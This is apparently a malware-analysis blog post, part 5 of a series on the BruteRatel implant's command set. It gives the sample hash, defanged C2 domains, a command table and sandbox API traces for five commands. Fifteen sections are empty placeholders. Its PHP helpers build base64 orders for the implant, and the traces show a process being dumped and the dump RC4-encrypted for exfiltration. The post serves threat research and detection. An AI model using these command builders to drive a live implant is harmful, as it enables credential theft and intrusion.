---
title: "BruteRatel full command analysis (5/X)"
date: 2025-04-10 
---

<link rel="stylesheet" href="/css/main.css">

## BRUTERATEL COMMAND LIST PART 5 

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041  
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041  
http://greshunka[.]com/admin.php:8041  

# INTRO  

This article is the 5th part of my full analysis of BruteRatel commands : [Previous Part](https://cedricg-mirror.github.io/2025/03/28/BruteRatel4.html)  

This detailed analysis will be split into several parts, I will be presenting in this post the next 20 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the next 20 command codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
|"\x9a\xe1"    | [GetFullPathNameW](#GetFullPathNameW) | $filename |
|"\x57\xa6"    | [inet_ntoa](#inet_ntoa) | $host |
|"\xf1\xa5"    | [dump_process_from_pid](#dump_process_from_pid) | $pid |
|"\x63\xd1"    | [adjustTokenPrivilege](#adjustTokenPrivilege) | $privilege |
|"\x3a\xe5"    | [GetFileTimeStamp](#GetFileTimeStamp) | $filename |
|"\xd3\xb1"    | [WbemCreateProcess](#WbemCreateProcess) | $CommandLine |
|"\x3e\xf8"    | [listdir2](#listdir2) | $dir_path |
|"\xb9\xe4"    | [GetDelegationToken](#GetDelegationToken) | $TargetName |
|"\x3a\xb9"    | [ping](#ping) | $host |
|"\x9c\xda"    | [GetCredentialsFromUiPrompt](#GetCredentialsFromUiPrompt) | $CaptionText |
|"\xe4\xcd"    | [GetThreadsInfo](#GetThreadsInfo) | $pid |
|"\xba\xe1"    | [InjectSetContext](#InjectSetContext) | $pid, $tid |
|"\xed\xf2"    | [connect_localhost_global_struct](#connect_localhost_global_struct) | $index |
|"\xd8\x3b"    | [WriteMemory](#WriteMemory) | $address, $data |
|"\x3b\xa2"    | [GetUsersPwdHashes](#GetUsersPwdHashes) | NA |
|"\xd2\xe3"    | [CreateProcessConf3](#CreateProcessConf3) | TODO |
|"\xd9\xa7"    | [unknown_update_global_struct](#unknown_update_global_struct) | TODO |
|"\xb3\xd2"    | [StopService](#StopService) | $MachineName, $ServiceName |
|"\x9a\x6c"    | [DelayCmdExec](#DelayCmdExec) | $delay |
|"\xd1\xf3"    | [unknown_network](#unknown_network) | $ip, $port, $unknown, $unknown2 |

In the following section, I share some dynamic analysis results from the aforementioned commands :  

<a id="GetFullPathNameW"></a>
# GetFullPathNameW  

```php
/*
	Retrieve the full path from the given file,
	Read up to 0x2000 bytes and report the result up to the first null bytes read
  ex : GetFullPathNameW("autorunsc64.exe");
*/
function GetFullPathNameW($filename)
{
	$filenameW = UConverter::transcode($filename, 'UTF-16LE', 'UTF-8');
	$filename_b64 = base64_encode($filenameW);
	$cmd_id = "\x9a\xe1 $filename_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [665]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000097DDD05A50
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+ef7QSMkOGDv2whCCK1hp61d+fGo6tPXyFLn0PSInEbGKFVnnuaxmWZuzXPGFDrHRILADuba+VvMEebzkWP7ie4FQ"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000097DDD18E80
[PAR] DWORD   *pcbBinary : 0x00000097DFCFED0C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x97dfc5bea1]
```

**II. Execution**   

```html
[CNT] [675]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[API] <GetFullPathNameW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName    : 0x00000097DDD22060
[STR]         -> "autorunsc64.exe"
[PAR] DWORD   nBufferLength : 0x104
[PAR] LPWSTR  lpBuffer      : 0x00000097DFCEEA20
[PAR] LPWSTR* lpFilePart    : 0x0
[RET] [0x97dfc67036]

[CNT] [686]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[API] <RtlDosPathNameToNtPathName_U> in [ntdll.dll] 
[PAR] PCWSTR               DosPathName    : 0x00000097DFCEEA20
[STR]                      -> "C:\Users\user\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[PAR] PUNICODE_STRING      NtPathName     : 0x00000097DFCEE9C0
[PAR] PCWSTR*              NtFileNamePart : 0x0
[PAR] PRTL_RELATIVE_NAME_U DirectoryInfo  : 0x0
[RET] [0x97dfc67095]

[CNT] [687]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenFile> in [ntdll.dll] 
[PAR] PHANDLE            FileHandle       : 0x00000097DFCEE9B0
[PAR] ACCESS_MASK        DesiredAccess    : 0x120089 (FILE_GENERIC_READ)
[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x00000097DFCEE9F0
[FLD]                    -> ObjectName = "\??\C:\Users\user\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[PAR] PIO_STATUS_BLOCK  IoStatusBlock     : 0x00000097DFCEE9D0
[PAR] ULONG             ShareAccess       : 0x1 (FILE_SHARE_READ)
[PAR] ULONG             OpenOptions       : 0x60 (FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE)
[RET] [0x97dfc74a05]

[CNT] [688]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtReadFile> in [ntdll.dll] 
[PAR] HANDLE           FileHandle      : 0x2f8
[PAR] HANDLE           Event           : 0x0
[PAR] PIO_APC_ROUTINE  ApcRoutine      : 0x0
[PAR] PVOID            ApcContext      : 0x0
[PAR] PIO_STATUS_BLOCK IoStatusBlock   : 0x00000097DFCEE9E0
[PAR] PVOID            Buffer          : 0x00000097DFCEEC28
[PAR] ULONG            Length          : 0x2000
[PAR] PLARGE_INTEGER   ByteOffset      : 0x00000097DFCEE9B8
[PAR] PULONG           Key             : 0x0
[RET] [0x97dfc75162]
```

**III. Result**   

Since the queried file is a PE, first NULL byte is encountered right after the 'MZ' magic.   

```html
[CNT] [694]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000097DDD04CB0
[STR]        -> "9AE1"
[STR]           "C:\Users\user\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[STR]           "MZ"
[PAR] DWORD  cbBinary   : 0x84
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000097DDD14D00
[PAR] DWORD* pcchString : 0x00000097DFCEE8BC
[RET] [0x97dfc5e028]
```

<a id="inet_ntoa"></a>
# inet_ntoa  

```php
// ex : inet_ntoa("tiguanin.com");
function inet_ntoa($host)
{
	$cmd_id = "\x57\xa6 $host";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000035A2FD46E0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Qr3MSPofMhbfwBC+H1ob92p8DytHwdzTJtM="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000035A2FDE670
[PAR] DWORD   *pcbBinary : 0x00000035A4FFE78C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x35a4f5bea1]
```

**II. Execution**   

```html
[CNT] [374]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <WSAStartup> in [ws2_32.dll] 
[PAR] WORD wVersionRequested : 0x202
[RET] [0x35a4f63fcd]

[CNT] [375]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <gethostbyname> in [ws2_32.dll] 
[PAR] PCHAR name : 0x00000035A2FE1060
[STR]       -> "tiguanin.com"
[RET] [0x35a4f63fe5]

[CNT] [384]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <inet_ntoa> in [ws2_32.dll] 
[PAR] struct in_addr in : 0x2e8ffea9
            -> 169.254.143.46
[RET] [0x35a4f6402b]
```

**III. Result**   

```html
[CNT] [395]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000035A2FF7300
[STR]        -> "57A6"
[STR]           "tiguanin.com 169.254.143.46"
[PAR] DWORD  cbBinary   : 0x40
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000035A2FC41C0
[PAR] DWORD* pcchString : 0x00000035A4FFE44C
[RET] [0x35a4f5e028]
```

<a id="dump_process_from_pid"></a>
# dump_process_from_pid  

```php
// ex : dump_process_from_pid("4064");
function dump_process_from_pid($pid)
{
	$cmd_id = "\xf1\xa5 $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [242]
[PTP] [0x12ac] [0xec0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000005A57FC7A10
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+LOrASNAcH0r11mv2Ui1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000005A57FEB680
[PAR] DWORD   *pcbBinary : 0x0000005A59FDEC0C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x5a59f3bea1]
```

**II. Execution**   

```html
[CNT] [262]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x0000005A5A54F330
[PAR] ACCESS_MASK         DesiredAccess    : 0x410 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x0000005A5A54F3C0
[PAR] PCLIENT_ID          ClientId         : 0x0000005A5A54F3A0
[FLD]                    -> UniqueProcess = 0xfe0
[FLD]                    -> UniqueThread  = 0x0
[RET] [0x5a59f54aab]

[CNT] [263]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtCreateTransaction> in [ntdll.dll] 
[PAR] PHANDLE             TransactionHandle : 0x0000005A5A54F340
[PAR] ACCESS_MASK         DesiredAccess     : 0x1f003f (TRANSACTION_ALL_ACCESS)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes  : 0x0000005A5A54F3C0
[PAR] LPGUID              Uow               : 0x0
[PAR] HANDLE              TmHandle          : 0x0
[PAR] ULONG               CreateOptions     : 0x0
[PAR] ULONG               IsolationLevel    : 0x0
[PAR] ULONG               IsolationFlags    : 0x0
[PAR] HANDLE              TmHandle          : 0x0
[PAR] HANDLE              TmHandle          : 0x0
[RET] [0x5a59f54587]

[CNT] [264]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <RtlSetCurrentTransaction> in [ntdll.dll] 
[PAR] HANDLE TransactionHandle : 0x304
[RET] [0x5a59f473f3]

[CNT] [265]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <RtlInitUnicodeString> in [ntdll.dll] 
[PAR] PCWSTR SourceString : 0x0000005A57FC83D0
[STR]        -> "\??\C:\Users\Public\cache"
[RET] [0x5a59f474b8]

[CNT] [266]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtCreateFile> in [ntdll.dll] 
[PAR] PHANDLE            FileHandle       : 0x0000005A5A54F338
[PAR] ACCESS_MASK        DesiredAccess    : 0x12019f (FILE_GENERIC_READ | FILE_GENERIC_WRITE)
[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x0000005A5A54F3C0
[FLD]                    -> ObjectName = "\??\C:\Users\Public\cache"
[PAR] PIO_STATUS_BLOCK  IoStatusBlock     : 0x0000005A5A54F390
[PAR] PLARGE_INTEGER    AllocationSize    : 0x0000005A5A54F370
[PAR] ULONG             FileAttributes    : 0x80
[PAR] ULONG             ShareAccess       : 0x3 (FILE_SHARE_READ | FILE_SHARE_WRITE)
[PAR] ULONG             CreateDisposition : 0x5 (FILE_DOES_NOT_EXIST)
[PAR] ULONG             CreateOptions     : 0x20 (FILE_SYNCHRONOUS_IO_NONALERT)
[RET] [0x5a59f5421a]

[ * ] [pid 0x12ac][tid 0xde0] c:\windows\system32\rundll32.exe
[EVT] [Kernel Monitoring]
[MSG] [FILE_CREATED] [C:\Users\Public\cache]

[CNT] [267]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <RtlSetCurrentTransaction> in [ntdll.dll] 
[PAR] HANDLE TransactionHandle : 0x0
[RET] [0x5a59f4757b]

[CNT] [288]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <SymInitializeW> in [dbghelp.dll] 
[PAR] HANDLE hProcess       : 0x300 
[PAR] PWSTR  UserSearchPath : 0x0 (null)
[PAR] BOOL   fInvadeProcess : 0x1
[RET] [0x5a59f4ebe0]

[CNT] [293]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtQuerySystemInformation> in [ntdll.dll] 
[PAR] SYSTEM_INFORMATION_CLASS SystemInformationClass  : 0x5 (SystemProcessInformation)
[PAR] PVOID                    SystemInformation       : 0x0000005A5BAB4100
[PAR] ULONG                    SystemInformationLength : 0x10000
[PAR] PULONG                   ReturnLength            : 0x0
[RET] [0x5a59f54f0d]

[CNT] [294]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <EnumerateLoadedModulesW64> in [dbghelp.dll] 
[PAR] HANDLE                          hProcess                  : 0x300 
[PAR] PENUMLOADED_MODULES_CALLBACKW64 EnumLoadedModulesCallback : 0x0000005A59F3E100
[PAR] PVOID                           UserContext               : 0x0000005A5A54F1F0
[RET] [0x5a59f4ec9c]

[CNT] [295]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <GetModuleFileNameExW> in [PSAPI.DLL] 
[PAR] HANDLE  hProcess   : 0x300 
[PAR] HMODULE hModule    : 0x00007FF6E4970000 
[PAR] LPWSTR  lpFilename : 0x0000005A5B44A73C
[PAR] DWORD   nSize      : 0x104
[RET] [0x5a59f397f2]

[CNT] [296]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <GetModuleFileNameExW> in [PSAPI.DLL] 
[PAR] HANDLE  hProcess   : 0x300 
[PAR] HMODULE hModule    : 0x00007FFE281C0000 (ntdll.dll)
[PAR] LPWSTR  lpFilename : 0x0000005A5B44A964
[PAR] DWORD   nSize      : 0x104
[RET] [0x5a59f397f2]

[CNT] [297]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <GetModuleFileNameExW> in [PSAPI.DLL] 
[PAR] HANDLE  hProcess   : 0x300 
[PAR] HMODULE hModule    : 0x00007FFE26240000 (KERNEL32.DLL)
[PAR] LPWSTR  lpFilename : 0x0000005A5B44AB8C
[PAR] DWORD   nSize      : 0x104
[RET] [0x5a59f397f2]

[...]

[CNT] [447]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringA> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000005A57FEB530
[STR]        -> "28-03-2025_14-46-57_4064.dmp"
[PAR] DWORD  cbBinary   : 0x1c
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPSTR  pszString  : 0x0000005A57FC83D0
[PAR] DWORD* pcchString : 0x0000005A5A54F19C
[RET] [0x5a59f3e0b1]
```

**III. Result**   

```html
[CNT] [453]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <SystemFunction032> in [CRYPTSP.DLL] 
[INF] [ Undocumented RC4 implementation ]
[PAR] PBINARY_STRING buffer : 0x0000005A5A54F140
[FLD]                -> Length    = 0xa6b2b
[FLD]                -> MaxLength = 0xa6b2b
[FLD]                -> Buffer    = 0x0000005A5AD50080
[STR]                -> "{"cds":{"auth":"OV1T557KBIUECUM5"},"dt":{"chkin":"TURNUJOnAAAEAAAAIAAAAAAAAABaAAAAAgAAAAAAAAAHAAAAOAAAAFAAAAAEAAAAhA0AAI"
[STR]                   "wAAAAJAAAAwBoAAAgYAAAAAAAAAAAAAAAAAAAJAAYACToCAQYAAAADAAAAgCUAAAIAAACIAAAAEAAAAEx3wgAAAAAAAAAAAAAAAAAA4fNZWgAAAAAAAAAgAA"
[STR]                   "AAAACX5PZ/AAAAkA4AU0EOAIhMUFQQDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAcKP5/AAAAwBoAvMYaAJ5VUFRODgAAvQTv/gAAAQADAAYAB0SAJQMABgAHRIAlPwAAAAAAAAAEAAQAAgAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkJv5/AAAA4BMA7A8UAMpUUFSODgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABJJf5/AAAAUBEAXE0RADdXUFTUDgAAvQTv/gAAAQADAA"
[STR]                   "YAB0SAJQMABgAHRIAlPwAAAAAAAAAEAAQAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJJv5/AAAAkFEBSzNUAU"
[STR]                   "A9UFQeDwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAACfJf5/AAAAQAUAJ74FAGM6UFRiDwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAADWGP5/AAAAABsAYPAaAG1AUFSmDwAAvQTv/gAAAQADAAYAB0SAJQMABgAHRIAlPwAAAAAAAAAEAAQAAgAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC+Jv5/AAAAoAoAMGgLABFUUFSSEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXJv5/AAAAEAwAmtUMAK1CUFTYEAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4I/5/AAAAkBIAXTkSAA"
[STR]                   "BWUFQeEQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   [TRUNCATED]
[PAR] PBINARY_STRING key    : 0x0000005A5A54F130
[FLD]                -> Length    = 0x10
[FLD]                -> MaxLength = 0x10
[FLD]                -> Buffer    = 0x0000005A57FACBA0
[STR]                -> "S47EFEUO3D2O6641"
[RET] [0x5a59f24c35]
```

<a id="adjustTokenPrivilege"></a>
# adjustTokenPrivilege  

```php
// ex: adjustTokenPrivilege("SeCreateTokenPrivilege");
function adjustTokenPrivilege($privilege)
{
	$cmd_id = "\x63\xd1 $privilege";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [341]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000D86C8C9A00
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+TbLQSMtqCDzY+gCjGkp511F8QjMJjd/dJLbkIxEON52CdFWYweFDbLXL"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000D86C8B2660
[PAR] DWORD   *pcbBinary : 0x000000D86E8AE5BC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xd86e80bea1]
```

**II. Execution**   

```html
[CNT] [348]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0xFFFFFFFFFFFFFFFF
[PAR] ACCESS_MASK DesiredAccess : 0x28 (TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES)
[PAR] PHANDLE     TokenHandle   : 0x000000D86E8AE4B8
[RET] [0xd86e824b2f]

[CNT] [349]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeValueA> in [ADVAPI32.dll] 
[PAR] LPCTSTR lpSystemName : 0x0 (null)
[PAR] LPCTSTR lpName       : 0x000000D86C8D35D0
[STR]         -> "SeCreateTokenPrivilege"
[RET] [0xd86e809926]

[CNT] [350]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <AdjustTokenPrivileges> in [ADVAPI32.dll] 
[PAR] HANDLE            TokenHandle          : 0x324
[PAR] BOOL              DisableAllPrivileges : 0x0
[PAR] PTOKEN_PRIVILEGES NewState             : 0x000000D86E8AE4CC
[PAR] DWORD             BufferLength         : 0x10
[PAR] PTOKEN_PRIVILEGES PreviousState        : 0x0
[PAR] PDWORD            ReturnLength         : 0x0
[RET] [0xd86e809966]

[CNT] [351]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeValueA> in [ADVAPI32.dll] 
[PAR] LPCTSTR lpSystemName : 0x0 (null)
[PAR] LPCTSTR lpName       : 0x000000D86C8D35D0
[STR]         -> "SeCreateTokenPrivilege"
[RET] [0xd86e80997a]

[CNT] [352]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <PrivilegeCheck> in [ADVAPI32.dll] 
[PAR] HANDLE         ClientToken        : 0x324
[PAR] PPRIVILEGE_SET RequiredPrivileges : 0x000000D86E8AE4DC
[PAR] LPBOOL         pfResult           : 0x000000D86E8AE4AC
[RET] [0xd86e8099c0]
```

<a id="GetFileTimeStamp"></a>
# GetFileTimeStamp  

```php
// ex : GetFileTimeStamp("autorunsc64.exe");
function GetFileTimeStamp($filename)
{
	$filenameW = UConverter::transcode($filename, 'UTF-16LE', 'UTF-8');
	$filename_b64 = base64_encode($filenameW);
	$cmd_id = "\x3a\xe5 $filename_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [242]
[PTP] [0x1100] [0x117c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000003032C11490
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+W/7ASMkOGDv2whCCK1hp61d+fGo6tPXyFLn0PSInEbGKFVnnuaxmWZuzXPGFDrHRILADuba+VvMEebzkWP7ie4FQ"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000003032C35F90
[PAR] DWORD   *pcbBinary : 0x0000003034C4E98C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x3034babea1]
```

**II. Execution**   

```html

```

**III. Result**   

```html
[CNT] [298]
[PTP] [0x1100] [0x117c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000003032C356C0
[STR]        -> "3AE5"
[STR]           "C:\Users\user\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[STR]           "806912"
[STR]           "AA 19/03/2025 14:34:20"
[STR]           "AB 19/03/2025 14:34:20"
[STR]           "AC 22/10/2024 00:18:28"
[STR]           "AD 22/10/2024 00:18:28"
[PAR] DWORD  cbBinary   : 0x142
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000003032C413C0
[PAR] DWORD* pcchString : 0x0000003034C4E2FC
[RET] [0x3034bae028]
```

<a id="WbemCreateProcess"></a>
# WbemCreateProcess  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="listdir2"></a>
# listdir2  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="GetDelegationToken"></a>
# GetDelegationToken  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="ping"></a>
# ping  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="GetCredentialsFromUiPrompt"></a>
# GetCredentialsFromUiPrompt  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="GetThreadsInfo"></a>
# GetThreadsInfo  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="InjectSetContext"></a>
# InjectSetContext  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="connect_localhost_global_struct"></a>
# connect_localhost_global_struct  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="WriteMemory"></a>
# WriteMemory  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="GetUsersPwdHashes"></a>
# GetUsersPwdHashes  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="CreateProcessConf3"></a>
# CreateProcessConf3  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="unknown_update_global_struct"></a>
# unknown_update_global_struct  

Update an array of base64 encoded data in the malware global state structure  
TODO  


<a id="StopService"></a>
# StopService  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="DelayCmdExec"></a>
# DelayCmdExec  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="unknown_network"></a>
# unknown_network  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```
